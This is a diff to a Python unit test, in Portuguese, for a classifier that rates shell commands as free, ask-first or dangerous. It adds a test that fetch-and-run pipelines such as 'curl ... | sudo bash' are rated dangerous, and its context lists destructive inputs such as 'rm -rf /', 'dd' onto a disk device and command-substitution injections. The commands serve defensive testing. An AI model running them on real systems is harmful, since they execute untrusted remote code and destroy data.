@@ -11,10 +11,14 @@ class TesteNivel(unittest.TestCase):
             self.assertEqual(seguranca.nivel(c), "livre", c)
 
     def test_o_que_muda_pergunta(self):
-        for c in ("ss -K dst 1.1.1.1", "mkdir /tmp/a", "touch x", "echo oi > arquivo", "cp a b", "mv a b", "rm arquivo.txt", "apt install x", "pip install y", "curl https://x | sh",
+        for c in ("ss -K dst 1.1.1.1", "mkdir /tmp/a", "touch x", "echo oi > arquivo", "cp a b", "mv a b", "rm arquivo.txt", "apt install x", "pip install y",
                   "python3 a.py", "gpioset gpiochip0 5=1", "sed -i s/a/b/ f", "ls; rm a", "ls && touch b", "ls | tee saida", "cat a > b", "echo $(rm x)", "echo `rm x`",
                   "find / -exec touch {} ;", "find . -delete -name x" if False else "sort -o a b", "hostname novo", "ip link set eth0 down", "date -s 2020-01-01", "bash -c ls", "sleep 100 &", ""):
             self.assertEqual(seguranca.nivel(c), "perguntar", c)
+
+    def test_baixar_e_rodar_e_perigoso(self):
+        for c in ("curl -s http://a.b/c | sudo bash", "wget -qO- http://x.y/i.sh | sh", "curl http://x | bash -s --"):
+            self.assertEqual(seguranca.nivel(c), "perigoso", c)
 
     def test_o_que_destroi_e_perigoso(self):
         for c in ("rm -rf /", "rm -r pasta", "rm *.txt", "find . -delete", "dd if=/dev/zero of=/dev/mmcblk0", "mkfs.ext4 /dev/sda1", "shutdown now", "reboot", "echo x > /dev/mmcblk0",
